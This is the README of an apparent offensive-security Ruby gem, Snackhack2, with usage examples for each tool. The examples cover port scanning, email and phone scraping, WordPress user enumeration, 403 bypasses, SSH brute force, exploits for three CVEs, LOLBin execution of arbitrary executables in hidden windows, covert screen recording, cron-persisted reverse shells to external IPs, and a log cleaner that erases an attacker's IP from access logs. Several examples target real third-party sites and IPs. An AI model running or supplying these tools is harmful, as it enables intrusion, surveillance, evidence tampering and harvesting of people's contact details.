<p align="center">
    <img src="https://i.imgur.com/R5JEtiq.png">
</p>

# Snackhack2

### What is SnackHack?

A collection of scripts that could be used to aid in hacking or performing recon on a target. The idea of this project is to take techniques learned in college to get experience and a better understanding of the techniques used to perform recon & hacking. 
Originally this idea was a part of my senior project but I had to ditch the idea. 

## Banner Grabbing.

Banner grabbing is used to get information about a server or computer. This information could help the hacker determine if the server or service is vulnerable. This information could also be used to figure out the best way to enumerate a service. 

## Extracting Emails & Phone Numbers.

Scraping Emails or phone numbers from a site could be used to attempt to Social Engineer a user from that site via email, phone, or SMS. Not all phishing emails or texts contain misspellings or improper grammar. Some common techniques used when writing phishing emails or messages include the following:

- Intimidation
- Scarcity
- Familiarity
- Trust
- Urgency
- Authority
- Consensus

These techniques work to manipulate the user to give information or perform a certain task like entering their password into a phishing page.

## Robots.txt & Sitemap.xml.

The Robots.txt file is used by sites to tell web crawlers such as Google what paths to crawl and what paths to ignore. Not every crawler will honor the robots.txt file. The site's robots.txt file will include paths that they do not want to be crawled, we can use this information to possibly access paths that will disclose sensitive information. It could also lead hackers to areas of the site that are not supposed to be viewed by unauthorized users. The sitemap.xml includes a list of URLs of a site. This helps Google and other search engines to be able to crawl links on a site. It is supposed to help with search ranking. 

When a site displays a cryptocurrency address on the site, the address could be used to discover more sites that are owned by the site or even their financial situation because some cryptocurrency's blockchains are public. Cryptocurrencies like Bitcoin, DogeCoin, and Litecoin blockchains are public, meaning you can see the amount of coins owned by the address. Cryptocurrencies that have a public blockchain have blockchain explorers that can be used to see how much an address has. It can also be used to view past transactions. 

Not all cryptocurrencies balances are public, cryptocurrencies like Monero have a private blockchain meaning that you CAN'T see how much a certain address has. 

## Website MetaData & Google Analytics.

Websites use the HTML meta tag to include information about the site that is supposed to help in being ranked higher on a search engine. This information could also be used to figure out what software or even the software version. Finding the Google Analytics tag could aid a hacker in locating different sites that are probably owned by the same owner. 

## Port Scanning. .

Scanning the first thousand ports of a server or computer will help reveal the purposes of the server and might give the hacker a way into the computer's internal network. If the server shows that port 22 is open, the hacker might be able to brute force the SSH server or figure out the version of the service and exploit a vulnerability. This feature will only scan TCP ports. Future versions might include UDP ports.

## Enumerating Web Content Management Platforms.

Figuring out what plugins or versions of the Web content management platforms can aid the hacker in compromising the site. The information could also be used to gather information about the site owners such as the usernames which could be used to brute force the login for a certain user. The disclosure of the version and other information could also be used by a hacker to attempt to exploit a vulnerability. Information like the MySQL version could be used to get into the site's database where they might be able to dump the database and login as the administrator of the site or use it to hack other users of the site.  

## Exploits.

Exploits can be used to gain unauthorized access to a server or computer. Currently, Snackhack2 has exploits for CVE-2023-3710, 
CVE-2018-11709 and CVE-2015-6522. `CVE-2018-11709` is an XSS exploit. At the same time, CVE-2023-3710 exploits a command injection vulnerability on a printer web page. This could allow hackers access to the network. `CVE-2015-6522` allows remote attackers to execute arbitrary SQL commands in the WordPress plugin, wp-symposium.

## Post Exploitation.

After exploiting a vulnerability and gaining access to the server, a hacker might want to hide their tracks. As of right now, there is only one post-exploitation feature in Snackhack. This feature will take the web server logs, remove a certain IP, and replace it with a randomly generated IP. This could be used to cover your tracks or as an anti-forensic method. A reverse shell is used to be 
able to access a remote computer at will. A remote fordward SSH will let you connect to a remote server's port to a local machine's port. From the remote server you can have remote shell to the local machine that is behind a firewall.

## Installation

```ruby
gem install snackhack2
```

## Usage

### Random IP Port Scan

This feature will generate 100 random IPS and scan the top 1k ports. By default it will generate 10 random IPs.

```ruby
tcp = Snackhack2::PortScan.new
tcp.count = 100
tcp.mass_scan
```

### Indirect Command Injection

This allows you to execute exe's using features built into Windows. 


This will execute a exe with the prompt "test". By default the @title is "Click Me!". But this can be changed as seen below. The title can also be changed. 

```ruby
cj = Snackhack2::CommandInjection.new
cj.prompt = "test"
ck.title  = "CLICK ME"
cj.wlrmdr_With_prompt
```
This does the same as the "wlrmdr_with_prompt" but without the prompt. By default the `@exe` will execute "calc.exe" but this can be changed as seen below. 
```ruby
cj = Snackhack2::CommandInjection.new
cj.exe = "runme.exe"
cj.wlrmdr_without_prompt
```

## Conhost.exe
Conhost.exe is a LOLBin that can be used to execute commands. By default it will execute "calc.exe"
```ruby
cj = Snackhack2::CommandInjection.new
cj.exe = "malware.exe"
cj.conhost


## This will run the same  thing but the window will be hidden. 
cj.conhost_hide
```
## SSH.exe to execute command.
By default this command uses "calc.exe" but the exe can be changed as seen below. 

```ruby
cj = Snackhack2::CommandInjection.new
cj.exe = "runme.exe"
cj.ssh
```

### LolBin MSR.exe Recording Screen

This feature uses Psr.exe to record the screen. By default it will record for 60 seconds. This can be changed by this:

```ruby
ss = Snackhack2::ScreenShot.new
ss.time = 64
ss.run
```
After the selected time, a new file, which by default is named "screenshots.zip" will be created. This will contain the screenshots.

The snippet below shows how `zip` can be used to create a different named zip file.

PSR is built into Windows, many threat actors will use this feature to record the activity of a victims. Threat actors could use the screenshots to monitor the users, learn the company's procedures, record the user entering passwords.  This all can be done without a third party tool, LOLBins which stand for living off the land are tools built in to windows that can be used by threat actors for malicious purposes. LOLBins such as PSR can be used without the threat actor having to download a tool or worrying about the tool being detected by AntiVirus


```ruby
ss = Snackhack2::ScreenShot.new
ss.zip = "Test.zip"
ss.run
```
## Forward Remote SSH Tunnel

```ruby
ssh = Snackhack2::SSHForwardRemote.new
ssh.site  = "187.171.198.132"
ssh.user  = "root"
ssh.pass  = "secretpassword"
ssh.key   = "/home/JakeFromStateFarm/.ssh/id_rsa"
ssh.lport = 2222
ssh.lsite = "localhost"
ssh.rport = 8022

ssh.run
```
- lport: local IP
- lport: local Port
- lsite: local Site
- rport: remote Port

Now on the remote box run the following command:

```ruby
ssh -p8022 jake@localhost
```
This could be used to access a computer that is behind a firewall, if 187.171.198.132 is reachable via the internet. Make sure that the remote PC has a strong SSH password. It is connected to the internet so IT WILL be scanned by people trying break in. Use a SSH key too. 

## Detect Drupal

Like the wordpress feature, there is a drupal score. The higher the score the better chance the site is using Drupal. Each time Drupal is detected it increases the score by 10. The `.all` will run all the different Drupal tests. 

```ruby
d = Snackhack2::Drupal.new("https://physiologycore.umn.edu/")
# Find out how many users the site has.
d.user_brute
# This will run all the methods to detect Drupal.
d.all
# This will just run the drupal score method. This will also print out the version of Drupal. 
d.drupal_score
```

## IP Lookup

Get IP of a site using Nslookup and ping.

```ruby
ip = Snackhack2::IpLookup.new
ip.site = "https://google.com"
ip = run
```

```ruby
ip = Snackhack2::IpLookup.new
ip.site = "https://google.com"
ip.socket
```
## Extract Emails from Website

By default @max_depth is set to four. This can be changed as seen below. This wil save the emails with the host name of the site
and the '_emails.txt'. For example: 'example.com_emails.txt'


```ruby
e = Snackhack2::Email.new("https://www.tupeloschools.com/leadership/staff-directory")
e.run

# set @max_depth to two
e.max_depth = 2
puts e.max_depth
```

## Web Server log cleaner

You supply a IP and the code will find all the traces of the ip in the web server Log file and replace it with a fake IP that is randomly generated . By default it reads from "/var/log/access.log", but that can be changed. It has to be ran with root.

```ruby
wc = Snackhack2::WebServerCleaner.new
wc.ip = '83.149.9.216'
wc.run
```

## WordPress

There is 7 different elements in an array. The code loops through each line of the source code of the page, checking for that element in the source. If it is found it adds
10 to the score. The higher the score the more likely it is a site with Wordpress.

```ruby
require "snackhack2"
wp = Snackhack2::WordPress.new
wp.site = "https://kinsta.com"
wp.run
```

Now get wordpress user's. This will save the users in a file with a similar name like this: google.com_users.txt. `wp_content_uploads` will check to see if there are any open directories. 

```ruby
wp = Snackhack2::WordPress.new
wp.site = "https://kinsta.com"
wp.users
# print out users instead of saving to file.
wp = Snackhack2::WordPress.new(save_file: false)
wp.site = "https://kinsta.com"
wp.users

# you can also set it to false like this:
wp = Snackhack2::WordPress.new
wp.site = "https://kinsta.com"
wp.save_file = false

wp.users


## check to see if a site has wp-conent with open directories!
wp.wp_content_uploads

## Look at multiple sites for wordpress.

["https://google.com", "https://kinsta.com", "https://porchlightshop.com", "https://www.drrajatgupta.com"].each do |site|
    wp = Snackhack2::WordPress.new
    wp.site = site
    puts "#{site}: "
    wp.run
    puts "\n"
end
```
## Reverse Shell
Will print out the command to run and will set a cron job that will run every minute that will use Netcat to connect to the server. 

```ruby
rs = Snackhack2::ReverseShell.new
rs.ip   = "167.71.98.144"
rs.port = "99"
rs.ncat
```

This will use bash.exe to connect to a reverse shell. On the remote computer run: `nc -lvp 4444`. After running the code below the computer will connect to the remote server, giving the threat actor remote control of the computer. This is all done by Living of the land, without any third party tools, just the features built into Windows. This is favored by threat actors since they do not need to install any malware that could be detected and remvoed.

```ruby
rs = Snackhack2::ReverseShell.new
rs.ip   = "167.71.98.144"
rs.port = "99"

rs.bash


## Version 2 of bash

rs.nc

```
## List Users

Search for a certain user, in this case a user name admin. It will display all the information about the user.
```
lu = Snackhack2::ListUsers.new
lu.user = "admin"
lu.windows_search_user
```

List all users in Linux systems
Will list all users that are in the `/etc/passwd` file.

```ruby
lu = Snackhack2::ListUsers.new
lu.linux
```

List all users on Windows. This feature uses `net user` command. 

```ruby
lu = Snackhack2::ListUsers.new
lu.windows
```
Auto Detect OS to run the list user commands on Linux or Windows systems.
```ruby
lu = Snackhack2::ListUsers.new
lu.auto
```
## Bypass 403 Errors

The following methods can be used to bypass 403 errors. If the site gives a `200` repsonse code than the bypass was succesful. 
The first method is to use two `//`. The second method is to capitalize random letters in the path. The third method is to use dots, a semi colon and slash like (`..;/`). 

```ruby
ph = Snackhack2::BypassHTTP.new
ph.site = "https://example.com"
ph.dots

ph = Snackhack2::BypassHTTP.new
ph.site = "https://example.com"
ph.basic

ph = Snackhack2::BypassHTTP.new
ph.site = "https://example.com"
ph.uppercase

ph = Snackhack2::BypassHTTP.new
ph.site = "https://example.com"
ph.url_encode
```

## Links

Grab all the links in a site and save it in a file named `google.com_links.txt` By default `@save_file` is set as `true`. If set to false it will print out all the links.


```ruby
links = Snackhack2::WebsiteLinks.new
links.site = "https://www.bleepingcomputer.com/news/security/signal-downplays-encryption-key-flaw-fixes-it-after-x-drama/"
links.run

# set @save_file as false
links.save_file = false

```
## Snackhack CLI

```ruby
ruby snackhack.rb -h
```

## Clean server version

This will remove all files that include all files that have `_severversion` in the file name. The `_serversversion` files are created by Snackhack2::curl. 

```ruby
Snackhack2::clean_serverversion
```

## Read server version files

This will read all files with `_serverversion` in the file name. This is used if serverversion is used on a bunch of sites that you need to check and read. 

```ruby
SnackHack::read_serverversion
```

## Port Scan

This uses multi thread to scan the first 1,000 ports and print the open ports. 

```ruby
tcp = Snackhack2::PortScan.new
tcp = "167.71.98.134"
tcp.run
```

## Robots.txt

This reads the robots.txt file and tries both the disallow and allow item and test to see if they are valid.

```ruby
ip = Snackhack2::Robots.new("https://google.com", save_file: true)
puts ip.run
```

## Banner Grabber

Banner grabbing is when you get information about a computer system. This information can be used to gather what version of software or what OS the computer is running. This information could also be used to plan an attack or used to find a exploit for the version of the software. 

```ruby
bg = Snackhack2::BannerGrabber.new("https://google.com")
bg.run

## Usin cURL

bg.curl

## Just get server name 
bg.server


["https://google.com", "https://kinsta.com", "https://porchlightshop.com", "https://www.drrajatgupta.com"].each do |site|
    s = Snackhack2::BannerGrabber.new(site)
    puts s.curl
end
```

## Google Analytics

This could be used to find other sites on the web that uses the same g code

```ruby
ga = Snackhack2::GoogleAnalytics.new
ga.site = "https://g-form.com"
ga.run
```

## Website Meta Data

```ruby
me = Snackhack2::WebsiteMeta.new
me.site = 'https://kinsta.com'
me.run
```

## Banner grabber with cURL

```ruby
bg = Snackhack2::BannerGrabber.new("https://google.com")
bg.curl
# .server will give you the website's server banner
bg.server
```
## Crypto Extrator

By default it @save_file is set by true. But can be changed to false as seen below. If set to false it will print it out. This will find crypto addresses displayed on websites and save them to a file or print them out. Currently it supports: BTC, DOGE, XMR, ETH, Tron, Ripple, Dash, NEO, BitcoinCash and LiteCoin

```ruby
ca = Snackhack2::CryptoExtractWebsite.new("https://www.coincarp.com/currencies/tron/richlist/")
puts ca.save_file
ca.save_file = false
puts ca.save_file
ca.run

ca.monero
ca.bitcoin
ca.litecoin
ca.dash
ca.stellar
ca.ethereum
ca.bitcoincash
ca.dogecoin
```

## Sitemap.xml

This class will try to see if a site has a sitemap.xml file. This could be used to find URLS that might be of intrest.

```ruby
sm = Snackhack2::SiteMap.new("https://google.com")
sm.run
```
## TomCat

This will visit `/docs/` which if the web server is running Tom Cat, it will parse the page and print out the TomCat version. 

```ruby
tc = Snackhack2::TomCat.new("https://recrutements-ec.univ-lille.fr")
tc.run
```

## Honeywell PM43

This will exploit CVE-2023-3710. By default it uses the `ls` command.  This can be changed as seen below. 

```ruby
s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")

# The command can be changed as seen below. 
s.command = "id"
puts s.command
# This will run the exploit. and print out the command output.
s.run
```

## Phone Number Extractor

Get phone numbers from a site. Use the following command to install spidr

```ruby
 sudo gem install spidr
 ```

```ruby
wp = Snackhack2::PhoneNumber.new
wp.site = "https://pastebin.com/PgJuhznU"
wp.run

```

## Phone Number Web Spider

```ruby
pn = Snackhack2::PhoneNumber.new
pn.site = "https://google.com"
pn.spider
# will print the phone numbers instead of saving them to file
ph.save_file = false
```

## wpForo Forum <= 1.4.11 - Unauthenticated Reflected Cross-Site Scripting (XSS)

```ruby
wp = Snackhack2::WPForoForum.new("http://www.example.com")
wp.run
```

## WordPress Plugin WP Symposium 15.1 - 'get_album_item.php' SQL Injection

Get MySQL version. 

```ruby
wp = Snackhack2::WP_Symposium.new("https://example.com")
wp.run
```
## Website MetaData

```ruby
me = Snackhack2::WebsiteMeta.new('https://kinsta.com')
me.run
```

## Subdomains

Uses DNS to find subdomains & IPs

```ruby
sd = Snackhack2::Subdomains.new("https://ruby-lang.org")
sd.run
```

## Subdomains2

This uses HTTP instead of DNS to find subdomains. By default the subdomain list is located in the `\lib\snackhack2\lists\subdomains.txt` directory. 

```ruby
Snackhack2::Subdomains2.new("https://netflix.com").run
```

## SSH Brute

```ruby
Snackhack2::SSHBute.new("167.98.80.8").run
```

## Rakefile
This command will run all the possible rakefile commands. 

```ruby
rake -T
```

This command will build, push, install the gem.

```ruby
rake gems:all
```
This rake command will run all the snackhack2 testing.
```ruby
rake snackhack:all
```
## Install needed gems

```ruby
gem install httparty
gem install spidr
gem install async-http -v 0.59.4
gem install net-ssh
```